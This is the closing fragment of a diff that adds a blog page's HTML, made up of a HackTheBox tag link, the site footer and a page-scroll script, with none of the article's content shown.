+</pre></div>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
